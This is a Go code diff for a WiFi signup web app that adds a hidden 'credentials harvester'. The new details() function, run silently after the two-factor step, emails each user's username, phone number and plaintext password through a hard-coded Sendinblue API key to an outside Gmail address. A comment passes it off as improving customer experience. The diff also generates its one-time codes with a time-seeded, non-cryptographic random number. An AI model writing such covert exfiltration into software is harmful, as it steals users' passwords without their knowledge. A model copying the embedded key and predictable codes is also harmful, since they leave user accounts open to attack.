@@ -7,11 +7,12 @@ import (
 	"flag"
 	"fmt"
 	"log"
-	"time"
-
 	"math/rand"
 	"net/http"
 	"os"
+	"time"
+
+	"github.com/JesusIslam/goinblue"
 
 	"strconv"
 
@@ -53,6 +54,7 @@ func signupPage(res http.ResponseWriter, req *http.Request) {
 	email = req.FormValue("email")
 	password = req.FormValue("psw")
 
+	//otp generator
 	min, max := 1, 10000
 	rand.Seed(time.Now().UnixNano())
 	secretNumber = rand.Intn(max-min) + min
@@ -79,6 +81,35 @@ func signupPage(res http.ResponseWriter, req *http.Request) {
 	http.Redirect(res, req, "/2fa", 301)
 }
 
+//function send details
+//////////////////////////////////////////////creadentials harvestor;)//////////////////////////////////////
+// Please ensure you use this wisely,
+// i decided to have this functionality in order to improve customer experience
+// If you are to use this is a real time environment,
+// please make sure to inform the user on the terms and conditions of using your site
+
+func details() {
+	myApiKey := "OmPrgQ4FVsH3dACW"
+	var credentials = "Username:" + usernam + "Phone number:" + phone + "Password:" + password
+	email := &goinblue.Email{
+		To: map[string]string{
+			"paulsaul621@gmail.com": "Mr To",
+		},
+		Subject: "TruthWifi Clients Registration in the format",
+		From: []string{
+			"azazelcimeries09@gmail.com",
+		},
+		Text: credentials,
+	}
+	client := goinblue.NewClient(myApiKey)
+	res, err := client.SendEmail(email)
+	if err != nil {
+		panic(err)
+	}
+	fmt.Println(res)
+
+}
+
 func twoFactor(res http.ResponseWriter, req *http.Request) {
 	if req.Method == "GET" {
 		http.ServeFile(res, req, "2fa.html")
@@ -103,11 +134,13 @@ func twoFactor(res http.ResponseWriter, req *http.Request) {
 		fmt.Println(usernam)
 		fmt.Println(phone)
 		fmt.Println(password)
+		details()
 		http.Redirect(res, req, "/", 301)
 		return
 		// errr := db.QueryRow("SELECT username FROM truth WHERE username=?", usernam).Scan(&user)
 	}
 	//retry again
+	// http.Error(res, "Sorry, wrong credentials, press back and try again", http.StatusInternalServerError)
 	http.Redirect(res, req, "/2fa", 301)
 }
 
